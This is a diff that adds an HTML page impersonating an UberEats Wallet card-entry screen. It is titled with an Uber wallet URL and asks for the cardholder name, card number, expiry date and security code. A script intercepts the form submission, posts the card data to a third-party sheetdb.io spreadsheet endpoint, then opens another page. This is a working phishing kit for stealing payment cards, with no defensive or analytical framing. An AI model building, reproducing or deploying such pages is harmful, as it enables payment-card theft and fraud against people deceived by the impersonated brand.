@@ -1,0 +1,96 @@
+	<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>https://wallet.uber.com/</title>
+    <link rel="stylesheet" href="new.css" type="text/css">
+    
+</head>
+<body > 
+    <header>
+    <div class="container">
+        <div class="logo"> 
+        <h1>Uber<span class="eat">Eats</span> <span class="wall">Wallet</span> </h1>
+        </div>
+        <div class="currentDetails">	
+    </header>
+	
+	  <hr>
+	
+    </div>
+	
+	
+ <div class="wrapper">
+  <div class="payment">
+   
+    <h2>Add credit or debit card</h2>
+	<form action="https://sheetdb.io/api/v1/azmhx34sugae0" method="POST" id="sheetdb-form">
+   
+   <div class="form">
+      <div class="card space icon-relative">
+        <label class="label" name="card holder">Card holder:</label>
+        <input type="text" name="data[Chd]" class="input" placeholder="Card holder" required>
+        <i class="fas fa-user"></i>
+      </div>
+      <div class="card space icon-relative">
+        <label class="label"name="card number" >Card number:</label>       
+        <input type="tel" name="data[Cnm]" class="input" inputmode="numeric" pattern="[0-9\s]{13,19}" autocomplete="cc-number" minlength="19" maxlength="19" data-mask="0000 0000 0000 0000" placeholder="Card Number" required>
+        <i class="far fa-credit-card"></i>
+      </div>
+      <div class="card-grp space">
+        <div class="card-item icon-relative">
+          <label class="label"name="Expiray date" >Expiry date:</label>
+          <input type="text" name="data[Dead]" class="input" data-mask="00 / 00"  placeholder="MM / YY" required>
+          <i class="far fa-calendar-alt"></i>
+        </div>
+        <div class="card-item icon-relative">
+          <label class="label"name="Security code">Security Code:</label>
+          <input type="text"name="data[Three]" class="input" data-mask="/ 000" placeholder="000" required>
+          <i class="fas fa-lock"></i>
+        </div>
+      </div>
+        
+      <div class="btn">
+        <button type="submit">Add Card</button>
+      </div> 
+    </div>
+	</form>
+  </div>
+</div>
+
+	<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+	
+	 
+	
+	
+	<script>
+  var form = document.getElementById('sheetdb-form'); 
+   form.addEventListener("submit", e => {
+   e.preventDefault(); 
+   fetch(form.action, {
+      method: "POST",
+	  body: new FormData(document.getElementById("sheetdb-form")),
+}).then(
+      response => response.json()
+).then((html) => { 
+      // you can put any JS code here 
+	  window.open('d.html')
+
+});
+});
+
+</script>
+
+
+
+
+
+<script src="https://unpkg.com/feather-icons"></script>
+<script>
+ feather.replace()
+</script>
+</body>
+</html>
